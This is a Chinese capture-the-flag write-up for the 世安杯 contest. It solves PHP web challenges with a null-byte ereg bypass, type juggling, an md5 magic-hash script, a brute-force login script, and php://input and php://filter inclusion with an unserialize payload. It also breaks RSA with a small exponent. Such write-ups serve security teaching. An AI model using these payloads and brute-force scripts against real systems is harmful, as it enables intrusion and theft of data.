---
title: 世安杯WP
tags: 新建,模板,小书匠
grammar_cjkRuby: true
---


## ctf入门及题目
有源码

``` 
<?php
$flag = '*********';

if (isset ($_GET['password'])) {
    if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
        echo '<p class="alert">You password must be alphanumeric</p>';
    else if (strpos ($_GET['password'], '--') !== FALSE)
        die($flag);
    else
        echo '<p class="alert">Invalid password</p>';
}
?>
```
直接ereg 判断必须为 alphanumeric 而strpos要求带--，想到利用阶段
password=123%00--

## 曲奇饼
发现有文件包含
`?line=&file=a2V5LnR4dA==`
可以读到index.php源码

``` 
<?php
error_reporting(0); 
$file=base64_decode(isset($_GET['file'])?$_GET['file']:""); 
$line=isset($_GET['line'])?intval($_GET['line']):0; 
if($file=='') header("location:index.php?line=&file=a2V5LnR4dA=="); 
$file_list = array( 
'0' =>'key.txt', 
'1' =>'index.php', 
); 
if(isset($_COOKIE['key']) && $_COOKIE['key']=='an_yun_tec'){  
$file_list[2]='thisis_key.php'; 
} 
if(in_array($file, $file_list)){ 
$fa = file($file); 
echo $fa[$line]; 
} 
?>
```


然后审计下构造如下请求： 

$_COOKIE['key']=='an_yun_tec'

?file=thisis_key.php

拿到flag

## 类型
有源码

``` 
 <?php
show_source(__FILE__);
$a=0;
$b=0;
$c=0;
$d=0;
if (isset($_GET['x1']))
{
        $x1 = $_GET['x1'];
        $x1=="1"?die("ha?"):NULL;
        switch ($x1)
        {
        case 0:
        case 1:
                $a=1;
                break;
        }
}
$x2=(array)json_decode(@$_GET['x2']);
if(is_array($x2)){
    is_numeric(@$x2["x21"])?die("ha?"):NULL;
    if(@$x2["x21"]){
        ($x2["x21"]>2017)?$b=1:NULL;
    }
    if(is_array(@$x2["x22"])){
        if(count($x2["x22"])!==2 OR !is_array($x2["x22"][0])) die("ha?");
        $p = array_search("XIPU", $x2["x22"]);
        $p===false?die("ha?"):NULL;
        foreach($x2["x22"] as $key=>$val){
            $val==="XIPU"?die("ha?"):NULL;
        }
        $c=1;
}
}
$x3 = $_GET['x3'];
if ($x3 != '15562') {
    if (strstr($x3, 'XIPU')) {
        if (substr(md5($x3),8,16) == substr(md5('15562'),8,16)) {
            $d=1;
        }
    }
}
if($a && $b && $c && $d){
    include "flag.php";
    echo $flag;
}
?> 
```
第一个是switch没有加break，所以用0绕过
第二个php 当字符串与数字比较时现将字符串转化为数字2018a绕过
第三个同第二个绕过 0 ==‘XIPU’
第四个 php 0e弱类型
脚本如下

``` 
import random
import string
import re
def md5(str):
    import hashlib
    m = hashlib.md5()
    m.update(str)
    return m.hexdigest()



while 1:
    string = ''
    s = string.join(random.sample('qwertyuiopasdfghjklzxcvbnm1234567890',4))
    if (re.findall('^0e[0-9]{14,14}$',md5('XIPU'+s)[8:24])):
        print 'XIPU'+s,md5('XIPU'+s)[8:24]

```

## 登录
发现源码有提示 五位数字的密码

写脚本跑吧

``` 
# coding:utf-8
import requests
import re
import threading

r = requests.session()
url = 'http://ctf1.shiyanbar.com/shian-s/index.php'

def get_rand():
	s = r.get(url=url)
	return re.findall("[0-9]{3,6}",s.content)[0]

def test(password):
	data = {
	'username':'admin',
	'password':password,
	'randcode':get_rand()
	}
	s = r.get(url=url,params=data)	
	if "密码错误" not in s.content:
		print s.content,password
		exit()


for i in range(9999):
	test("0"*(5-len(str(i)))+str(i))

for i in range(10000,100000):
	test(i)
	# print i

```

![][1]

## admin
有源码

``` 
<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
 -->
```
文件包含
利用伪协议绕过
(file_get_contents($user,'r')==="the user is admin"

php://input 即可
然后利用php://fiter/convert.base64-encode/resource=index.php
读取源码
发现是个反序列化

``` 
<?php
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    if(preg_match("/f1a9/",$file)){
        exit();
    }else{
        include($file); //class.php
        $pass = unserialize($pass);
        echo $pass;
    }
}else{
    echo "you are not admin ! ";
}

?>

<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
 --
```

坑在这里

``` 
include($file); //class.php
        $pass = unserialize($pass);
        echo $pass;
```
这里在提交最后的payload的时候必须include  class.php
因为里面有tostring方法 能echo执行

所以最后的payload为
`http://localhost:8000/?user=php://input&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=f1a9.php";}`


## RSA
只给了nc ，那么8成是低加密指数攻击
``` 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = '4ct10n'
from libnum import s2n,n2s
from gmpy import root
n = 92164540447138944597127069158431585971338721360079328713704210939368383094265948407248342716209676429509660101179587761913570951794712775006017595393099131542462929920832865544705879355440749903797967940767833598657143883346150948256232023103001435628434505839331854097791025034667912357133996133877280328143
e = 3
c = 2044619806634581710230401748541393297937319

i = 0
while 1:
    res = root(c+i*n,3)
    if(res[1] == True):
        print n2s(res[0])
        break
    print "i="+str(i)
    i = i+1

```


  [1]: 世安杯WP/1.png
